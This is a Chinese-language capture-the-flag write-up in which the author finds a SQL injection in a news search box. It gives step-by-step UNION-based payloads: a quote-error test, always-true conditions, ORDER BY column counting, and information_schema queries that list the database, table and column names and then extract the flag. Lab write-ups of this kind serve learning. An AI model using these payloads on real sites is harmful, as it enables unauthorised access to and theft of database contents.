Basic SQL

题目

解题思路

如图所示，题目包含一个搜索框，当我们搜索”hello”，页面会返回给我们关于”hello”这个条目的新闻。
题目非常的清晰直接，我们只需要利用好这个搜索框进入SQL注入，提取我们需要的flag即可。
但是这是我第一次接触SQL，也有无从下手的感觉。
这里推荐新手去寻找一些教程，学习一些基本的SQL语句，了解SQL注入的原理和过程。
我的运气比较好，身边正好有SQL注入的课件，于是照着课件一点一点操作，才通过了这道题。

解题过程

首先进行一个简单的单引号判断，在搜索框内输入任意字符+单引号，例如

hello'

搜索之后页面报错，说明该处存在SQL漏洞。
这里的原理是，SQL进行WHERE命令闭合需要0个或者2个单引号，当单引号出现单数，无论是哪种类型的SQL漏洞，都会出现报错。
判断出有漏洞之后，我们需要验证漏洞类型，来构建我们的闭合语句。
常见的漏洞类型有3种。
1）字符型漏洞：闭合语句两个单引号，可以使用 ‘and 1=2 and ‘%’=’
2）数字型漏洞：闭合语句无单引号，可以用 and 1=1 ;and 1=2
3）搜索引擎漏洞：存在%，可以使用 ‘and 1=2 and ‘%’=’
闭合语句的方式很多，不依次列举，感兴趣的同学可以自行查阅。
这道题上我使用的是 %’ or 1=1 #
根据SQL语法的特点’#’后面的内容会被注释掉。
接下来逐步解题。
一、验证漏洞类型，搜索

hello%' or 1=1 #

永真条件，页面遍历出所有的新闻信息，验证成功，根据这一特性我们可以构建我们的命令破解信息。

二、爆破字段，输入 hello %’ ORDER by 3 # 页面返回正常；hello %’ ORDER by 4 # 报错，因此判断字段长度为3。

三、判断回显位，输入 hello %’ and 1=1 union select 1,2,3 # ，判断回显位，观察到2，3两个位置显现。

四、暴库，输入以下代码，在3位置显示数据库名，可以看到网站的数据库是’news’

hello %' and 1=2 union select 1,2, SCHEMA_NAME from information_schema.SCHEMATA  #

五、猜表，输入以下代码，可以发现有两个表，其中一个的名字是’f1agfl4gher3’，那就没跑了，就是它。

hello %'union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = 'news' #

六、猜字段，输入以下代码，发现目标表中存在一个’h3r31sfl4g’的字段。

hello %' union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = 'f1agfl4gher3' #

七、破解信息，输入以下代码，得到flag

hello %'  union select 1,2,h3r31sfl4g from f1agfl4gher3 #
